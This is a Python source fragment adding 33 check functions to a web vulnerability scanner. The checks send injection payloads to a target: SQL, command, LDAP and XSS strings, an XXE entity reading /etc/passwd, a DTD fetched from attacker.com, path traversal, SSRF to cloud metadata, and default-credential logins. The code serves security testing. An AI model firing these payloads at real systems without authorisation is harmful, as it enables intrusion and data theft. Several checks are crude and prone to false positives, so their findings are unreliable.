# VULN_SCANNER - 33 NEW CHECK FUNCTIONS
# Estas funciones se agregarán al archivo tt después de run_vuln_scanner()

    # ============ HELPER FUNCTIONS ============
    
    def _get_severity_color(self, severity):
        """Get color based on severity"""
        colors = {
            'Critical': Fore.RED,
            'High': Fore.LIGHTRED_EX,
            'Medium': Fore.YELLOW,
            'Low': Fore.LIGHTYELLOW_EX,
            'Info': Fore.CYAN
        }
        return colors.get(severity, Fore.WHITE)
    
    def _export_vuln_scan_results(self, target, scan_type, vulnerabilities, elapsed):
        """Export vulnerability scan results to JSON and TXT"""
        timestamp = int(time.time())
        
        # JSON Export
        json_data = {
            'target': target,
            'scan_type': scan_type,
            'timestamp': timestamp,
            'scan_time': f'{elapsed:.2f}s',
            'total_vulns': len(vulnerabilities),
            'severity_breakdown': {
                'Critical': sum(1 for v in vulnerabilities if v['severity'] == 'Critical'),
                'High': sum(1 for v in vulnerabilities if v['severity'] == 'High'),
                'Medium': sum(1 for v in vulnerabilities if v['severity'] == 'Medium'),
                'Low': sum(1 for v in vulnerabilities if v['severity'] == 'Low'),
                'Info': sum(1 for v in vulnerabilities if v['severity'] == 'Info'),
            },
            'vulnerabilities': vulnerabilities
        }
        
        json_file = f'vuln_scan_{target.replace("http://", "").replace("https://", "").replace("/", "_")}_{timestamp}.json'
        with open(json_file, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # TXT Export
        txt_file = f'vuln_scan_{target.replace("http://", "").replace("https://", "").replace("/", "_")}_{timestamp}.txt'
        with open(txt_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("VULNERABILITY SCAN REPORT - KNDYS FRAMEWORK v3.0\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan Type: {scan_type.upper()}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            f.write(f"Duration: {elapsed:.2f} seconds\n")
            f.write(f"Total Vulnerabilities: {len(vulnerabilities)}\n\n")
            
            # Risk distribution
            f.write("Risk Distribution:\n")
            for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                count = sum(1 for v in vulnerabilities if v['severity'] == severity)
                if count > 0:
                    f.write(f"  {severity}: {count}\n")
            f.write("\n" + "=" * 70 + "\n\n")
            
            # Group by category
            categories = {}
            for vuln in vulnerabilities:
                cat = vuln['category']
                if cat not in categories:
                    categories[cat] = []
                categories[cat].append(vuln)
            
            for category, vulns in categories.items():
                f.write(f"CATEGORY: {category}\n")
                f.write("-" * 70 + "\n")
                for vuln in vulns:
                    f.write(f"[{vuln['severity'].upper()}] {vuln['name']}\n")
                    f.write(f"Details: {vuln['details']}\n")
                    f.write(f"Remediation: {vuln['remediation']}\n")
                    f.write("\n")
                f.write("\n")
        
        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f"  • {json_file}")
        print(f"  • {txt_file}")
    
    # ============ 33 CHECK FUNCTIONS ============
    
    # Category 1: Injection (5 checks)
    
    def _check_sql_error_based(self, url):
        """Check for error-based SQL injection"""
        payloads = ["'", '"', "')", "';", "' AND 1=CONVERT(int, @@version)--", "' OR 1=CAST(@@version AS INT)--"]
        error_patterns = [
            r"SQL.*error", r"Warning.*mysql", r"PostgreSQL.*ERROR", r"ORA-\d+",
            r"Microsoft.*Driver", r"syntax.*error", r"unclosed.*quotation", r"unterminated.*string"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return ('Critical', f"SQL error with payload: {payload}", "Use parameterized queries, input validation")
            except:
                pass
        return None
    
    def _check_sql_time_based(self, url):
        """Check for time-based SQL injection"""
        time_payloads = ["' OR SLEEP(5)--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--", "' OR pg_sleep(5)--"]
        
        for payload in time_payloads:
            try:
                test_url = f"{url}{payload}"
                start = time.time()
                requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=15, verify=False)
                elapsed = time.time() - start
                if elapsed > 4:
                    return ('Critical', f"Time-based SQLi with delay: {elapsed:.2f}s", "Use parameterized queries")
            except requests.exceptions.Timeout:
                return ('Critical', f"Timeout-based SQLi with payload: {payload}", "Use parameterized queries")
            except:
                pass
        return None
    
    def _check_nosql_injection(self, url):
        """Check for NoSQL injection (MongoDB)"""
        payloads = ["[$ne]=1", "{'$ne': null}", "{'$gt': ''}", "admin'||'1'=='1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if response.status_code == 200 and len(response.text) > 100:
                    return ('High', f"Potential NoSQL injection with: {payload}", "Sanitize NoSQL queries, use ODM")
            except:
                pass
        return None
    
    def _check_command_injection_advanced(self, url):
        """Check for command injection"""
        payloads = ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "|| ping -c 5 127.0.0.1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                start = time.time()
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=15, verify=False)
                elapsed = time.time() - start
                if elapsed > 4 or 'uid=' in response.text:
                    return ('Critical', f"Command injection detected: {payload}", "Never execute user input, use safe APIs")
            except:
                pass
        return None
    
    def _check_ldap_injection(self, url):
        """Check for LDAP injection"""
        payloads = ["*", "*)(uid=*", "admin*", "*()|&'"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if 'ldap' in response.text.lower() or 'directory' in response.text.lower():
                    return ('Medium', f"Potential LDAP injection: {payload}", "Escape LDAP special characters")
            except:
                pass
        return None
    
    # Category 2: XSS (3 checks)
    
    def _check_reflected_xss(self, url):
        """Check for reflected XSS"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                    return ('High', f"Reflected XSS with: {payload[:30]}...", "Encode output, use CSP headers")
            except:
                pass
        return None
    
    def _check_stored_xss(self, url):
        """Check for stored XSS (basic check)"""
        payload = f"<script>alert('stored-{int(time.time())}')</script>"
        try:
            requests.post(url, data={'comment': payload}, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if payload in response.text:
                return ('Critical', "Stored XSS detected in comment field", "Sanitize stored data, encode on output")
        except:
            pass
        return None
    
    def _check_dom_xss(self, url):
        """Check for DOM-based XSS"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            dangerous_sinks = ['innerHTML', 'outerHTML', 'document.write', 'eval(', 'setTimeout', 'location.href']
            if any(sink in response.text for sink in dangerous_sinks):
                return ('Medium', "Potential DOM XSS sinks detected", "Avoid unsafe DOM manipulation")
        except:
            pass
        return None
    
    # Category 3: Broken Authentication (3 checks)
    
    def _check_weak_auth(self, url):
        """Check for weak authentication"""
        creds = [('admin', 'admin'), ('admin', 'password'), ('root', 'root'), ('test', 'test')]
        
        for user, pwd in creds:
            try:
                response = requests.post(url, data={'username': user, 'password': pwd}, timeout=10, verify=False)
                if response.status_code == 200 and 'dashboard' in response.text.lower():
                    return ('Critical', f"Weak credentials: {user}:{pwd}", "Enforce strong password policy")
            except:
                pass
        return None
    
    def _check_session_mgmt(self, url):
        """Check session management"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            cookies = response.cookies
            issues = []
            for cookie in cookies:
                if not cookie.secure:
                    issues.append(f"Cookie {cookie.name} missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append(f"Cookie {cookie.name} missing HttpOnly flag")
            if issues:
                return ('Medium', '; '.join(issues), "Set Secure and HttpOnly flags on cookies")
        except:
            pass
        return None
    
    def _check_jwt_vulns(self, url):
        """Check for JWT vulnerabilities"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if 'authorization' in response.headers.get('Authorization', '').lower():
                token = response.headers['Authorization'].replace('Bearer ', '')
                if token.count('.') == 2:
                    header = token.split('.')[0]
                    decoded = json.loads(base64.b64decode(header + '=='))
                    if decoded.get('alg') == 'none':
                        return ('Critical', "JWT with 'none' algorithm", "Validate JWT signature, reject 'none' alg")
        except:
            pass
        return None
    
    # Category 4: Sensitive Data (4 checks)
    
    def _check_ssl_config(self, url):
        """Check SSL/TLS configuration"""
        if url.startswith('https'):
            try:
                response = requests.get(url, timeout=10)
                if not response.url.startswith('https'):
                    return ('High', "HTTPS downgrade detected", "Enforce HTTPS with HSTS")
            except:
                return ('High', "SSL/TLS certificate error", "Use valid SSL certificate")
        else:
            return ('Medium', "Site not using HTTPS", "Migrate to HTTPS")
        return None
    
    def _check_sensitive_files(self, url):
        """Check for exposed sensitive files"""
        files = ['.env', '.git/config', 'config.php', 'backup.sql', 'id_rsa', '.htaccess', 'web.config']
        
        for file in files:
            try:
                test_url = f"{url}/{file}" if not url.endswith('/') else f"{url}{file}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('High', f"Sensitive file exposed: {file}", "Remove or protect sensitive files")
            except:
                pass
        return None
    
    def _check_info_disclosure(self, url):
        """Check for information disclosure"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if 'Server' in response.headers:
                server = response.headers['Server']
                if any(tech in server.lower() for tech in ['apache/2', 'nginx/1', 'iis/7', 'php/5']):
                    return ('Low', f"Server version disclosed: {server}", "Remove server version headers")
        except:
            pass
        return None
    
    def _check_security_headers_advanced(self, url):
        """Check for missing security headers"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            missing = []
            headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-XSS-Protection': 'XSS filter'
            }
            for header, desc in headers.items():
                if header not in response.headers:
                    missing.append(desc)
            if missing:
                return ('Medium', f"Missing headers: {', '.join(missing)}", "Implement security headers")
        except:
            pass
        return None
    
    # Category 5: XXE (2 checks)
    
    def _check_xxe_advanced(self, url):
        """Check for XXE vulnerabilities"""
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
        try:
            response = requests.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            if 'root:' in response.text:
                return ('Critical', "XXE: /etc/passwd read successful", "Disable XML external entities")
        except:
            pass
        return None
    
    def _check_dtd_injection(self, url):
        """Check for DTD injection"""
        dtd_payload = '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd"><root></root>'
        try:
            response = requests.post(url, data=dtd_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            if 'attacker' in response.text or response.status_code == 500:
                return ('High', "DTD injection possible", "Disable DTD processing")
        except:
            pass
        return None
    
    # Category 6: Access Control (3 checks)
    
    def _check_idor(self, url):
        """Check for IDOR vulnerabilities"""
        if 'id=' in url or '/user/' in url or '/profile/' in url:
            return ('Medium', "Potential IDOR in URL parameters", "Implement access control checks")
        return None
    
    def _check_path_traversal_advanced(self, url):
        """Check for path traversal"""
        payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if 'root:' in response.text or '[extensions]' in response.text:
                    return ('High', f"Path traversal with: {payload}", "Validate and sanitize file paths")
            except:
                pass
        return None
    
    def _check_forced_browsing(self, url):
        """Check for forced browsing"""
        paths = ['/admin', '/config', '/backup', '/phpinfo.php', '/test', '/dev']
        
        for path in paths:
            try:
                test_url = f"{url}{path}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('Medium', f"Accessible path: {path}", "Implement proper access controls")
            except:
                pass
        return None
    
    # Category 7: Security Misconfiguration (13 checks)
    
    def _check_cors(self, url):
        """Check for CORS misconfiguration"""
        try:
            response = requests.get(url, headers={'Origin': 'http://evil.com'}, timeout=10, verify=False)
            if response.headers.get('Access-Control-Allow-Origin') == '*':
                return ('High', "CORS allows all origins (*)", "Restrict CORS to specific origins")
            if response.headers.get('Access-Control-Allow-Origin') == 'http://evil.com':
                return ('High', "CORS reflects arbitrary origin", "Validate allowed origins")
        except:
            pass
        return None
    
    def _check_http_methods(self, url):
        """Check for dangerous HTTP methods"""
        try:
            response = requests.options(url, timeout=10, verify=False)
            if 'Allow' in response.headers:
                methods = response.headers['Allow']
                dangerous = [m for m in ['PUT', 'DELETE', 'TRACE', 'CONNECT'] if m in methods]
                if dangerous:
                    return ('Medium', f"Dangerous HTTP methods: {', '.join(dangerous)}", "Disable unnecessary HTTP methods")
        except:
            pass
        return None
    
    def _check_default_creds(self, url):
        """Check for default credentials"""
        return ('Info', "Manual check recommended for default credentials", "Change default credentials")
    
    def _check_verbose_errors(self, url):
        """Check for verbose error messages"""
        try:
            test_url = f"{url}/nonexistent-page-12345"
            response = requests.get(test_url, timeout=10, verify=False)
            if any(err in response.text.lower() for err in ['traceback', 'exception', 'stack trace', 'error at line']):
                return ('Low', "Verbose error messages detected", "Implement custom error pages")
        except:
            pass
        return None
    
    def _check_debug_mode(self, url):
        """Check for debug mode enabled"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            if any(debug in response.text.lower() for debug in ['debug mode', 'debug=true', 'debugger', 'xdebug']):
                return ('Medium', "Debug mode appears enabled", "Disable debug mode in production")
        except:
            pass
        return None
    
    def _check_csrf_advanced(self, url):
        """Check for CSRF protection"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form', method='post')
            for form in forms:
                has_token = any(inp.get('name', '').lower() in ['csrf', 'token', '_token'] for inp in form.find_all('input'))
                if not has_token:
                    return ('Medium', "POST form without CSRF token", "Implement CSRF tokens")
        except:
            pass
        return None
    
    def _check_clickjacking(self, url):
        """Check for clickjacking protection"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            if 'X-Frame-Options' not in response.headers and 'Content-Security-Policy' not in response.headers:
                return ('Medium', "No clickjacking protection", "Set X-Frame-Options or CSP frame-ancestors")
        except:
            pass
        return None
    
    def _check_open_redirect(self, url):
        """Check for open redirect"""
        payloads = ["http://evil.com", "//evil.com", "https://evil.com"]
        
        for payload in payloads:
            try:
                test_url = f"{url}?redirect={payload}"
                response = requests.get(test_url, allow_redirects=False, timeout=10, verify=False)
                if response.status_code in [301, 302] and payload in response.headers.get('Location', ''):
                    return ('Medium', f"Open redirect to: {payload}", "Validate redirect URLs")
            except:
                pass
        return None
    
    def _check_ssrf_advanced(self, url):
        """Check for SSRF vulnerabilities"""
        payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost", "http://127.0.0.1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}?url={payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                if 'ami-id' in response.text or len(response.text) > 0:
                    return ('High', f"Potential SSRF to: {payload}", "Validate and restrict URL parameters")
            except:
                pass
        return None
    
    def _check_outdated_libs(self, url):
        """Check for outdated JavaScript libraries"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            outdated = []
            patterns = [
                (r'jquery[-.]?(\d+\.\d+)', '1.9', 'jQuery'),
                (r'angular[-.]?(\d+\.\d+)', '1.6', 'AngularJS'),
                (r'bootstrap[-.]?(\d+)', '4', 'Bootstrap')
            ]
            for pattern, min_ver, lib in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match and match.group(1) < min_ver:
                    outdated.append(f"{lib} {match.group(1)}")
            if outdated:
                return ('Medium', f"Outdated libraries: {', '.join(outdated)}", "Update JavaScript libraries")
        except:
            pass
        return None
    
    def _check_api_docs(self, url):
        """Check for exposed API documentation"""
        endpoints = ['/api/docs', '/swagger', '/api-docs', '/swagger-ui', '/api/swagger.json']
        
        for endpoint in endpoints:
            try:
                test_url = f"{url}{endpoint}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200 and ('swagger' in response.text.lower() or 'api' in response.text.lower()):
                    return ('Info', f"API documentation at: {endpoint}", "Protect API documentation")
            except:
                pass
        return None
    
    def _check_backup_files(self, url):
        """Check for accessible backup files"""
        extensions = ['.bak', '.old', '.backup', '~', '.swp', '.zip', '.tar.gz']
        
        for ext in extensions:
            try:
                test_url = f"{url}/backup{ext}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('High', f"Backup file accessible: backup{ext}", "Remove backup files from web root")
            except:
                pass
        return None
    
    def _check_host_header_injection(self, url):
        """Check for host header injection"""
        try:
            response = requests.get(url, headers={'Host': 'evil.com'}, timeout=10, verify=False)
            if 'evil.com' in response.text:
                return ('Medium', "Host header injection detected", "Validate Host header")
        except:
            pass
        return None
